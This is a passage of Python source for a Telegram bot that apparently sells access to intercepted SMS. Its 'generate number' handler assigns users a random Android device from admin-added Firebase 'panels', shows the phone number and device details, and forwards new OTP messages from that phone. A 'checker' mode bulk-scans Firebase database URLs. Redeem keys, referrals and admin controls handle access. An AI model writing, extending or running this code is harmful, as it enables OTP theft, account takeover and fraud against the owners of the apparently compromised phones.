                "❌ File not found or link expired.",
                reply_markup=main_home_kb(uid),
            )
            return
        try:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=info["file_id"],
                caption=(
                    f"📁 <b>{html_escape(info.get('file_name') or 'file')}</b>\n"
                    f"⬇️ Downloads: <code>{int(info.get('downloads') or 0) + 1}</code>\n\n"
                    f"🛡️ VIP ALL IN ONE"
                ),
                parse_mode="HTML",
            )
            bump_file_download(token)
        except Exception as exc:
            logger.error("file share send failed: %s", exc)
            await update.message.reply_text(
                "❌ Could not send file (may be deleted from Telegram).",
                reply_markup=main_home_kb(uid),
            )
        return

    # --- Referral ---
    if payload.startswith("ref_"):
        try:
            referrer_id = int(payload[4:])
            result = await process_referral(referrer_id, uid)
            if result["success"]:
                try:
                    ref_msg = _bold_blockquote(
                        "🎉 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n\n"
                        f"👤 @{username} 𝗝𝗢𝗜𝗡𝗘𝗗 𝗨𝗦𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗟𝗜𝗡𝗞\n\n"
                        f"⏳ +{REFERRAL_HOURS} 𝗛𝗢𝗨𝗥𝗦 𝗔𝗖𝗖𝗘𝗦𝗦 𝗔𝗗𝗗𝗘𝗗\n"
                        f"📊 𝗔𝗖𝗖𝗘𝗦𝗦 : {result.get('referrer_remaining', 'N/A')}")
                    await context.bot.send_message(
                        chat_id=referrer_id, text=ref_msg, parse_mode="HTML")
                except Exception as exc:
                    logger.exception(
                        f"[REFERRAL] notification failed: referrer={referrer_id}, err={exc}")
        except (ValueError, TypeError):
            pass

    # Main menu: force-join + captcha only (Checker/File FREE — no OTP time required)
    if not await _require_access(update, context, require_otp=False):
        return

    stop_sms_monitor(uid)
    _stop_admin_panel_live_task(uid)
    sess = await _ensure_session(uid)
    sess["devices"] = {}
    sess["current_device"] = ""
    sess["mode"] = "online"
    sess["awaiting_fb_add"] = False
    context.user_data.pop("awaiting_url", None)
    context.user_data.pop("awaiting_fb_add", None)

    try:
        await _send_main_menu(context, update.effective_chat.id, first_name, uid)
    except Exception as exc:
        logger.exception("start_cmd _send_main_menu failed uid=%s: %s", uid, exc)
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="VIP ALL IN ONE BOT\n\nMenu load issue. Try /start again.",
                reply_markup=plain_main_kb(uid),
            )
        except Exception:
            pass


# ============================================================
# GENERATE NUMBER
# ============================================================
async def _safe_edit_callback_message(q, text: str, *, parse_mode=None, reply_markup=None):
    """Edit callback message whether it is a photo (caption) or a text message."""
    msg = q.message
    is_photo = bool(getattr(msg, "photo", None))
    try:
        if is_photo:
            await q.edit_message_caption(
                caption=text, parse_mode=parse_mode, reply_markup=reply_markup)
        else:
            await q.edit_message_text(
                text, parse_mode=parse_mode, reply_markup=reply_markup)
        return True
    except Exception as e1:
        err = str(e1).lower()
        if "message is not modified" in err:
            return True
        try:
            await msg.delete()
        except Exception:
            pass
        try:
            await q.bot.send_message(
                chat_id=msg.chat_id, text=text,
                parse_mode=parse_mode, reply_markup=reply_markup)
            return True
        except Exception as e2:
            logger.error("safe edit failed: %s | fallback: %s", e1, e2)
            return False


async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not await _require_access(update, context, edit_target=q.message):
        return
    uid = q.from_user.id
    if uid not in ADMIN_IDS and is_feature_down("generate"):
        await _safe_edit_callback_message(
            q, feature_down_text("generate"), parse_mode="HTML",
            reply_markup=main_home_kb(uid))
        return
    if uid not in ADMIN_IDS and is_feature_down("otp"):
        await _safe_edit_callback_message(
            q, feature_down_text("otp"), parse_mode="HTML",
            reply_markup=main_home_kb(uid))
        return
    chat_id = q.message.chat_id
    sess = await _ensure_session(uid)

    if not global_fb_list:
        await _safe_edit_callback_message(
            q,
            "⚠️ *No numbers available right now.*\n\n"
            "Admin ne abhi koi Firebase add nahi kiya.\n"
            "Thodi der baad try karo.",
            parse_mode="Markdown", reply_markup=connect_inline_kb())
        return

    await _safe_edit_callback_message(q, "⚡ Generating from ready devices...")
    devices = dict(global_device_cache.get("devices") or {})
    sess["fb_list"] = list(global_fb_list)

    if not devices:
        await _safe_edit_callback_message(
            q,
            "⚠️ *Abhi ready online number nahi hai.*\n\n"
            "Admin device snapshot background me refresh ho raha hai.",
            parse_mode="Markdown", reply_markup=connect_inline_kb())
        return

    device_id, info = random.choice(list(devices.items()))
    sess["devices"] = {device_id: info}
    sess["current_device"] = device_id
    sess["mode"] = "online"

    tag = info.get("fb_tag", "?")
    real_cid = info.get("real_cid", device_id)
    phone = info.get("phone") or "N/A"
    raw = info.get("raw") or {}
    network = raw.get("network") or raw.get("operator") or "—"
    android = raw.get("android") or raw.get("androidVersion") or raw.get("os") or "—"
    battery = raw.get("battery") or raw.get("batteryLevel") or "—"
    if isinstance(battery, (int, float)):
        battery = f"{int(battery)}%"

    stop_sms_monitor(uid)

    # Delete previous SMS messages
    current_state = sms_monitor_state.get(uid)
    if current_state:
        message_ids = current_state.get("sent_message_ids", [])
        if message_ids:
            try:
                for msg_id in message_ids:
                    await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                    await asyncio.sleep(0.1)  # Small delay between deletes
            except Exception as e:
                logger.warning(f"could not delete old SMS messages: {e}")

    baseline_fingerprints = set()
    try:
        baseline_pairs = await fetch_last_sms(info.get("fb_url", ""), real_cid, limit=50)
        baseline_fingerprints = {
            _msg_fingerprint(key, message) for key, message in baseline_pairs
        }
        logger.info("[SMS MONITOR] baseline uid=%s device=%s count=%d",
                    uid, device_id, len(baseline_fingerprints))
    except Exception as exc:
        logger.warning("SMS baseline unavailable: %s", exc)

    start_sms_monitor(
        context.bot, uid, chat_id, device_id, unlimited=True,
        baseline_fingerprints=baseline_fingerprints,
        fb_url=info.get("fb_url", ""))

    text_msg = (
        f"{pe('tada')} <b>NUMBER GENERATED</b>\n\n"
        f"{pe('eyes')} Device: <code>{real_cid}</code>\n"
        f"{pe('online')} Phone: <code>{phone}</code>\n"
        f"{pe('diamond')} Panel: <code>{tag}</code>\n"
        f"{pe('online')} Status: ONLINE\n"
        f"📶 Network: {network}\n"
        f"🤖 Android: {android}\n"
        f"🔋 Battery: {battery}\n\n"
        f"{pe('check')} <b>OTP Monitor ON</b>\n"
        f"Naya OTP is chat me aayega.\n"
        f"Dubara GENERATE pe purana monitor band + messages delete.")
    await _safe_edit_callback_message(
        q, text_msg, parse_mode="HTML",
        reply_markup=device_actions_kb(device_id, "online"))


# ============================================================
# REDEEM + GENKEY COMMANDS
# ============================================================
async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User: /redeem VIP-XXXX-XXXX-XXXX"""
    user = update.effective_user
    user_id = user.id if user else 0
    args = context.args or []
    if not args:
        await update.message.reply_text(
            "🔑 <b>Redeem Key</b>\n\n"
            "Usage: <code>/redeem VIP-XXXX-XXXX-XXXX</code>\n\n"
            "OTP Dashboard unlock ke liye key chahiye.\n"
            f"Ya refer karo (1 refer = {REFERRAL_HOURS}h).\n\n"
            "🟢 Checker section FREE hai — key nahi chahiye.",
            parse_mode="HTML",
            reply_markup=main_home_kb(user_id),
        )
        return
    code = args[0].strip().upper()
    result = await redeem_key(user_id, code)
    if result.get("success"):
        await update.message.reply_text(
            f"✅ <b>Key Redeemed!</b>\n\n"
            f"🔑 <code>{code}</code>\n"
            f"⏳ Granted: <b>{result['hours']:g} hours</b>\n"
            f"📊 Your access: <b>{result['access_time']}</b>\n"
            f"👥 Key slots left: <code>{result['remaining_slots']}/{result['max_uses']}</code>\n\n"
            "Ab OTP Dashboard use kar sakte ho 👇",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔵 OTP DASHBOARD", callback_data="mode_otp")],
                [InlineKeyboardButton("🟢 CHECKER (FREE)", callback_data="mode_checker")],
                [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
            ]),
        )
        return
    reason = result.get("reason")
    if reason == "invalid":
        msg = "❌ Invalid key. Check and try again."
    elif reason == "disabled":
        msg = "❌ This key is disabled / exhausted."
    elif reason == "already_used":
        msg = "⚠️ You already redeemed this key."
    elif reason == "limit_reached":
        msg = f"❌ Key limit reached (max {result.get('max_uses', '?')} users)."
    else:
        msg = "❌ Redeem failed."
    await update.message.reply_text(
        f"{msg}\n\n🟢 Checker section still FREE.",
        parse_mode="HTML",
        reply_markup=main_home_kb(user_id),
    )


async def genkey_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /genkey <hours> [max_users]"""
    user = update.effective_user
    user_id = user.id if user else 0
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text(
            "🔑 <b>Generate Key</b>\n\n"
            "Usage: <code>/genkey hours [max_users]</code>\n\n"
            "Examples:\n"
            "<code>/genkey 24</code> — 24h, 1 user\n"
            "<code>/genkey 12 10</code> — 12h, 10 users can redeem\n"
            "<code>/genkey 48 5</code> — 48h, max 5 redeems",
            parse_mode="HTML",
        )
        return
    try:
        hours = float(args[0])
        max_uses = int(args[1]) if len(args) > 1 else 1
    except (ValueError, TypeError):
        await update.message.reply_text("❌ Invalid numbers. Example: <code>/genkey 24 5</code>", parse_mode="HTML")
        return
    if hours <= 0 or max_uses < 1:
        await update.message.reply_text("❌ hours > 0 and max_users >= 1 required.")
        return
    code = create_redeem_key(hours, max_uses, user_id)
    await update.message.reply_text(
        f"✅ <b>Key Created</b>\n\n"
        f"🔑 <code>{code}</code>\n"
        f"⏳ Hours: <b>{hours:g}</b>\n"
        f"👥 Max users: <b>{max_uses}</b>\n\n"
        f"Share: <code>/redeem {code}</code>",
        parse_mode="HTML",
    )


# ============================================================
# ADMIN COMMAND
# ============================================================
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    _stop_admin_panel_live_task(uid)
    await update.message.reply_text(
        "🛠 *Admin Panel*\n\nSelect an action:",
        parse_mode="Markdown", reply_markup=admin_panel_kb(uid))


# ============================================================
# CAPTCHA INPUT
# ============================================================
async def captcha_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "force_join_captcha" not in context.user_data:
        return
    raw = (update.message.text or "").strip()
    try:
        answer = int(re.sub(r"\D", "", raw))
    except ValueError:
        await update.message.reply_text(
            _bold_blockquote("❌ 𝗪𝗥𝗢𝗡𝗚 𝗔𝗡𝗦𝗪𝗘𝗥\n\n🧮 Sirf number bhejein."),
            parse_mode="HTML")
        return
    if answer != context.user_data.get("force_join_captcha"):
        question, new_answer = _new_math_captcha()
        context.user_data["force_join_captcha"] = new_answer
        await update.message.reply_text(
            _bold_blockquote(f"❌ 𝗪𝗥𝗢𝗡𝗚 𝗔𝗡𝗦𝗪𝗘𝗥\n\n🧮 Try: {question} = ?"),
            parse_mode="HTML")
        return
    context.user_data.pop("force_join_captcha", None)
    context.user_data["force_join_verified"] = True
    verified_access_users.add(update.effective_user.id)

    await update.message.reply_text(
        _bold_blockquote("✅ 𝗖𝗔𝗣𝗧𝗖𝗛𝗔 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗\n\n✅ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗!"),
        parse_mode="HTML")

    await _send_main_menu(context, update.effective_chat.id,
                          update.effective_user.first_name or "User",
                          update.effective_user.id)


# ============================================================
# ADMIN TEXT INPUT
# ============================================================
async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_fb_list
    uid = update.effective_user.id
    action = context.user_data.get("admin_action")
    if uid not in ADMIN_IDS or not action:
        return
    text = (update.message.text or "").strip()

    # ---------- ADD ADMIN (owner only): expects "<user_id>" ----------
    if action == "add_admin":
        if not is_owner(uid):
            context.user_data.pop("admin_action", None)
            await update.message.reply_text(
                "⛔ Sirf owner admin add kar sakta hai.",
                reply_markup=admin_panel_kb(uid))
            return
        try:
            target_uid = int(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Valid numeric user ID bhejein.\nExample: `123456789`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
            return
        result = add_admin_user(target_uid)
        context.user_data.pop("admin_action", None)
        if result["success"]:
            notified = False
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=_bold_blockquote(
                        "👑 𝗔𝗗𝗠𝗜𝗡 𝗚𝗥𝗔𝗡𝗧𝗘𝗗\n\n"
                        "✅ Ab aap admin panel use kar sakte ho.\n"
                        "Send /admin"),
                    parse_mode="HTML")
                notified = True
            except Exception as exc:
                logger.info("add-admin notify failed for %s: %s", target_uid, exc)
            await update.message.reply_text(
                f"✅ *Admin Added*\n\n"
                f"👤 User: `{target_uid}`\n"
                f"📨 Notified: `{'Yes' if notified else 'No'}`\n"
                f"👑 Total admins: `{len(ADMIN_IDS)}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
        else:
            reason = result.get("reason")
            msg = {
                "owner": "❌ Owner already super-admin hai.",
                "already": "⚠️ Yeh user pehle se admin hai.",
            }.get(reason, "❌ Failed.")
            await update.message.reply_text(msg, reply_markup=admin_panel_kb(uid))
        return

    # ---------- REMOVE ADMIN (owner only): expects "<user_id>" ----------
    if action == "remove_admin":
        if not is_owner(uid):
            context.user_data.pop("admin_action", None)
            await update.message.reply_text(
                "⛔ Sirf owner admin remove kar sakta hai.",
                reply_markup=admin_panel_kb(uid))
            return
        try:
            target_uid = int(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Valid numeric user ID bhejein.\nExample: `123456789`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
            return
        result = remove_admin_user(target_uid)
        context.user_data.pop("admin_action", None)
        if result["success"]:
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=_bold_blockquote(
                        "⚠️ 𝗔𝗗𝗠𝗜𝗡 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n\n"
                        "Aapka admin access hata diya gaya hai."),
                    parse_mode="HTML")
            except Exception as exc:
                logger.info("remove-admin notify failed for %s: %s", target_uid, exc)
            await update.message.reply_text(
                f"✅ *Admin Removed*\n\n"
                f"👤 User: `{target_uid}`\n"
                f"👑 Remaining admins: `{len(ADMIN_IDS)}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
        else:
            reason = result.get("reason")
            msg = {
                "owner": "❌ Owner ko remove nahi kar sakte.",
                "not_admin": "⚠️ Yeh user admin nahi hai.",
            }.get(reason, "❌ Failed.")
            await update.message.reply_text(msg, reply_markup=admin_panel_kb(uid))
        return

    # ---------- BAN USER: expects "<user_id>" ----------
    if action == "ban_user":
        try:
            target_uid = int(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Valid numeric user ID bhejein.\nExample: `123456789`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
            return
        if target_uid == OWNER_ID:
            await update.message.reply_text(
                "❌ Owner ko ban nahi kar sakte.",
                reply_markup=admin_panel_kb(uid))
            return
        if target_uid in ADMIN_IDS and not is_owner(uid):
            await update.message.reply_text(
                "⛔ Dusre admin ko sirf owner ban kar sakta hai.",
                reply_markup=admin_panel_kb(uid))
            return
        if target_uid == uid:
            await update.message.reply_text(
                "❌ Khud ko ban nahi kar sakte.",
                reply_markup=admin_panel_kb(uid))
            return
        result = ban_user(target_uid)
        context.user_data.pop("admin_action", None)
        if result["success"]:
            stop_sms_monitor(target_uid)
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=_bold_blockquote(
                        "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
                        "⛔ Bot access band kar diya gaya hai."),
                    parse_mode="HTML")
            except Exception as exc:
                logger.info("ban notify failed for %s: %s", target_uid, exc)
            await update.message.reply_text(
                f"🚫 *User Banned*\n\n"
                f"👤 User: `{target_uid}`\n"
                f"📋 Total banned: `{len(BANNED_USERS)}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
        else:
            reason = result.get("reason")
            msg = {
                "owner": "❌ Owner ko ban nahi kar sakte.",
                "already": "⚠️ Yeh user pehle se banned hai.",
            }.get(reason, "❌ Failed.")
            await update.message.reply_text(msg, reply_markup=admin_panel_kb(uid))
        return

    # ---------- UNBAN USER: expects "<user_id>" ----------
    if action == "unban_user":
        try:
            target_uid = int(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Valid numeric user ID bhejein.\nExample: `123456789`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
            return
        result = unban_user(target_uid)
        context.user_data.pop("admin_action", None)
        if result["success"]:
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=_bold_blockquote(
                        "✅ 𝗨𝗡𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
                        "Aapka bot access wapas mil gaya hai.\n"
                        "Send /start"),
                    parse_mode="HTML")
            except Exception as exc:
                logger.info("unban notify failed for %s: %s", target_uid, exc)
            await update.message.reply_text(
                f"✅ *User Unbanned*\n\n"
                f"👤 User: `{target_uid}`\n"
                f"📋 Remaining banned: `{len(BANNED_USERS)}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
        else:
            await update.message.reply_text(
                "⚠️ Yeh user banned list mein nahi hai.",
                reply_markup=admin_panel_kb(uid))
        return


    # ---------- HOST APPROVE: expects user_id ----------
    if action == "host_approve":
        try:
            target_uid = int(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Valid user ID bhejein.",
                reply_markup=admin_panel_kb(uid))
            return
        result = approve_hosting(target_uid)
        context.user_data.pop("admin_action", None)
        if result.get("success"):
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=(
                        "✅ <b>Hosting Approved!</b>\n\n"
                        "Ab aap <b>BOT HOSTING</b> use kar sakte ho.\n"
                        "Main menu → 🤖 BOT HOSTING"
                    ),
                    parse_mode="HTML",
                )
            except Exception:
                pass
            await update.message.reply_text(
                f"✅ Hosting approved for `{target_uid}`\n"
                f"Total approved: `{len(HOSTING_APPROVED)}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid),
            )
        else:
            await update.message.reply_text(
                "⚠️ Already approved.",
                reply_markup=admin_panel_kb(uid),
            )
        return

    if action == "host_revoke":
        try:
            target_uid = int(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Valid user ID bhejein.",
                reply_markup=admin_panel_kb(uid))
            return
        result = revoke_hosting(target_uid)
        context.user_data.pop("admin_action", None)
        if result.get("success"):
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text="🚫 Aapka <b>BOT HOSTING</b> access revoke ho gaya.",
                    parse_mode="HTML",
                )
            except Exception:
                pass
            await update.message.reply_text(
                f"✅ Hosting revoked for `{target_uid}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid),
            )
        else:
            await update.message.reply_text(
                "⚠️ User approved list mein nahi tha.",
                reply_markup=admin_panel_kb(uid),
            )
        return

    # ---------- GENKEY: expects "<hours> [max_uses]" ----------
    if action == "genkey":
        parts = text.split()
        try:
            hours = float(parts[0])
            max_uses = int(parts[1]) if len(parts) > 1 else 1
        except (ValueError, IndexError, TypeError):
            await update.message.reply_text(
                "❌ Format: `<hours> <max_users>`\nExample: `24 5`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid),
            )
            return
        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS:
            await update.message.reply_text(
                f"❌ Hours 0 se {GIFT_ACCESS_MAX_HOURS} ke beech.",
                reply_markup=admin_panel_kb(uid),
            )
            return
        if max_uses < 1 or max_uses > 10000:
            await update.message.reply_text(
                "❌ Max users 1–10000.",
                reply_markup=admin_panel_kb(uid),
            )
            return
        code = create_redeem_key(hours, max_uses, uid)
        context.user_data.pop("admin_action", None)
        await update.message.reply_text(
            f"✅ *Key Generated*\n\n"
            f"🔑 Key: `{code}`\n"
            f"⏳ Hours: `{hours:g}`\n"
            f"👥 Max users: `{max_uses}`\n\n"
            f"Users redeem with:\n`/redeem {code}`",
            parse_mode="Markdown",
            reply_markup=admin_panel_kb(uid),
        )
        return

    # ---------- GIFT SINGLE: expects "<user_id> <hours>" ----------
    if action == "gift_single":
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text(
                "❌ Format: `<user_id> <hours>`\n"
                "Example: `123456789 5`",
                parse_mode="Markdown", reply_markup=admin_gift_kb())
            return
        try:
            target_uid = int(parts[0].strip())
            hours = float(parts[1].strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Invalid user ID or hours. Example: `123456789 5`",
                parse_mode="Markdown", reply_markup=admin_gift_kb())
            return
        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS:
            await update.message.reply_text(
                f"❌ Hours 1 se {GIFT_ACCESS_MAX_HOURS} ke beech hone chahiye.",
                reply_markup=admin_gift_kb())
            return
        seconds = int(hours * 3600)
        _ensure_user_record(target_uid)
        grant_access(target_uid, seconds)
        context.user_data.pop("admin_action", None)
        remaining = format_remaining_time(target_uid)
        # Notify user
        notified = False
        try:
            await context.bot.send_message(
                chat_id=target_uid,
                text=_bold_blockquote(
                    "🎁 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗜𝗙𝗧𝗘𝗗\n\n"
                    f"⏳ 𝗚𝗶𝗳𝘁𝗲𝗱 𝗧𝗶𝗺𝗲 : {hours:g} 𝗛𝗼𝘂𝗿𝘀\n"
                    f"📊 𝗡𝗲𝘄 𝗔𝗰𝗰𝗲𝘀𝘀 : {remaining}\n\n"
                    "✅ 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁."),
                parse_mode="HTML")
            notified = True
        except Exception as exc:
            logger.info("gift notify failed for %s: %s", target_uid, exc)
        await update.message.reply_text(
            f"✅ *Access Gifted*\n\n"
            f"👤 User: `{target_uid}`\n"
            f"⏳ Hours: `{hours:g}`\n"
            f"📊 New Access: `{remaining}`\n"
            f"📨 Notified: `{'Yes' if notified else 'No'}`",
            parse_mode="Markdown", reply_markup=admin_panel_kb(uid))
        return

    # ---------- GIFT ALL: expects "<hours>" ----------
    if action == "gift_all":
        try:
            hours = float(text.strip())
        except (ValueError, TypeError):
            await update.message.reply_text(
                "❌ Invalid hours. Example: `5`",
                parse_mode="Markdown", reply_markup=admin_gift_kb())
            return
        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS:
            await update.message.reply_text(
                f"❌ Hours 1 se {GIFT_ACCESS_MAX_HOURS} ke beech hone chahiye.",
                reply_markup=admin_gift_kb())
            return
        seconds = int(hours * 3600)
        context.user_data.pop("admin_action", None)
        sent = failed = 0
        for target_uid in list(known_users):
            _ensure_user_record(target_uid)
            grant_access(target_uid, seconds)
            remaining = format_remaining_time(target_uid)
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=_bold_blockquote(
                        "🎁 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗜𝗙𝗧𝗘𝗗\n\n"
                        f"⏳ 𝗚𝗶𝗳𝘁𝗲𝗱 𝗧𝗶𝗺𝗲 : {hours:g} 𝗛𝗼𝘂𝗿𝘀\n"
                        f"📊 𝗡𝗲𝘄 𝗔𝗰𝗰𝗲𝘀𝘀 : {remaining}\n\n"
                        "✅ 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁."),
                    parse_mode="HTML")
                sent += 1
            except Exception as exc:
                failed += 1
                logger.info("gift-all notify failed for %s: %s", target_uid, exc)
        await update.message.reply_text(
            f"🎁 *Gift All Complete*\n\n"
            f"⏳ Hours: `{hours:g}`\n"
            f"👥 Total Users: `{len(known_users)}`\n"
            f"✅ Notified: `{sent}`\n"
            f"❌ Failed: `{failed}`",
            parse_mode="Markdown", reply_markup=admin_panel_kb(uid))
        return

    # ---------- ADD FIREBASE ----------
    if action == "add_firebase":
        url = normalize_fb_url(text)
        if not url:
            await update.message.reply_text("❌ Invalid Firebase URL.")
            return
        if any(u == url for u, _ in global_fb_list):
            await update.message.reply_text("⚠️ Already added.", reply_markup=admin_panel_kb(uid))
            context.user_data.pop("admin_action", None)
            return
        if len(global_fb_list) >= MAX_FIREBASES:
            await update.message.reply_text(f"❌ Max {MAX_FIREBASES}.",
                                            reply_markup=admin_panel_kb(uid))
            context.user_data.pop("admin_action", None)
            return
        msg = await update.message.reply_text("⏳ Validating Firebase...")
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
        try:
            clients, _ = await _try_fetch_clients(session, url)
            ok = bool(clients)
        finally:
            await session.close()
        if not ok:
            await msg.edit_text("❌ FIREBASE DEAD / empty.", reply_markup=admin_back_kb())
            return
        new_tag = f"FB{len(global_fb_list) + 1}"
        global_fb_list.append((url, new_tag))
        _save_global_firebases()
        context.user_data.pop("admin_action", None)
        await refresh_global_device_cache()
        online = offline = 0
        try:
            online, offline = await fetch_counts_from_one(url, new_tag)
        except Exception:
            pass
        await msg.edit_text(
            f"✅ *Firebase Added*\n\n🔗 `{new_tag}`\n"
            f"🟢 Online: `{online}`\n🔴 Offline: `{offline}`\n"
            f"📊 Panels: {len(global_fb_list)}/{MAX_FIREBASES}",
            parse_mode="Markdown", reply_markup=admin_panel_kb(uid))
        return

    # ---------- ADD CHANNEL ----------
    if action == "add_channel":
        username = text
        if username.startswith("https://t.me/"):
            username = "@" + username.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
        if not re.fullmatch(r"@[A-Za-z0-9_]{5,32}", username):
            await update.message.reply_text(
                "❌ Valid public channel username bhejein, example: @mychannel")
            return
        if any(str(c.get("id")).lower() == username.lower() for c in REQUIRED_CHANNELS):
            await update.message.reply_text("⚠️ Yeh channel already added hai.",
                                            reply_markup=admin_panel_kb(uid))
            context.user_data.pop("admin_action", None)
            return
        try:
            chat = await context.bot.get_chat(username)
            title = chat.title or username
        except Exception as exc:
            logger.warning("admin channel validation failed: %s", exc)
            await update.message.reply_text(
                "❌ Channel nahi mila ya bot ko access nahi hai.")
            return
        REQUIRED_CHANNELS.append({
            "id": username,
            "label": title,
            "url": f"https://t.me/{username.lstrip('@')}",
        })
        _save_required_channels()
        context.user_data.pop("admin_action", None)
        await update.message.reply_text(
            f"✅ Force-join channel added: *{title}*",
            parse_mode="Markdown", reply_markup=admin_panel_kb(uid))
        return

    # ---------- BROADCAST ----------
    if action == "broadcast":
        context.user_data.pop("admin_action", None)
        sent = failed = 0
        for target_uid in list(known_users):
            try:
                await context.bot.send_message(chat_id=target_uid, text=text)
                sent += 1
            except Exception as exc:
                failed += 1
                logger.info("broadcast failed for %s: %s", target_uid, exc)
        await update.message.reply_text(
            f"📢 Broadcast complete.\n\n✅ Sent: {sent}\n❌ Failed: {failed}",
            reply_markup=admin_panel_kb(uid))


async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("admin_action"):
        await admin_text_input(update, context)
        return
    if "force_join_captcha" in context.user_data:
        await captcha_input(update, context)
        return

    msg = update.message
    if not msg or not msg.text:
        return
    user = msg.from_user
    user_id = user.id if user else 0
    if user_id and is_banned(user_id) and user_id not in ADMIN_IDS:
        await msg.reply_text(
            _bold_blockquote(
                "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
                "⛔ Bot access band hai."),
            parse_mode="HTML")
        return
    username = (user.username or user.first_name) if user else "Unknown"
    chat_id = msg.chat_id
    txt = msg.text.strip()
    save_checker_user(user_id)

    mode = get_mode(user_id)

    # Feature maintenance for checker-related text
    if user_id not in ADMIN_IDS and (
        mode in ("check", "decode")
        or "firebaseio.com" in txt
        or "firebasedatabase.app" in txt
        or "-default-rtdb" in txt
        or "?s=" in txt
        or "vippannels" in txt.lower()
    ):
        if is_feature_down("checker"):
            await msg.reply_text(
                feature_down_text("checker"),
                parse_mode="HTML",
                reply_markup=main_home_kb(user_id))
            return

    # Checker / decode modes — process Firebase URLs & wrappers
    if mode in ("check", "decode") or (
        "firebaseio.com" in txt or "firebasedatabase.app" in txt or "-default-rtdb" in txt
        or "?s=" in txt or "vippannels" in txt.lower()
    ):
        raw_items = [item.strip() for item in txt.split(",")] if "," in txt else txt.splitlines()
        all_target_dbs = []
        for line in raw_items:
            line = line.strip()
            if not line:
                continue
            match = re.search(r"https?://[^\s]+", line)
            target_url = match.group(0) if match else line
            unpacked_dbs = extract_firebase_from_vercel_link(target_url)
            valid_dbs = [
                db for db in unpacked_dbs
                if "firebaseio.com" in db or "firebasedatabase.app" in db or "-default-rtdb" in db
            ]
            all_target_dbs.extend(valid_dbs)
        seen = set()
        unique_target_dbs = [x for x in all_target_dbs if not (x in seen or seen.add(x))][:2000]

        if len(unique_target_dbs) > 1:
            status_msg = await msg.reply_text(
                f"⚡ High-Speed Bulk Processing ({len(unique_target_dbs)} Firebase URLs)...",
                parse_mode="Markdown",
            )
            batch_outputs = await parse_batch_panels(unique_target_dbs)
            await store_user_databases(user_id, batch_outputs)
            report, active_list, dead_count, total_scanned = build_sorted_report(
                "High-Speed Bulk Scan Report", batch_outputs
            )
            out_path = os.path.join(tempfile.gettempdir(), f"VIP_Bulk_{user_id}_{int(time.time())}.txt")
            write_sorted_txt(
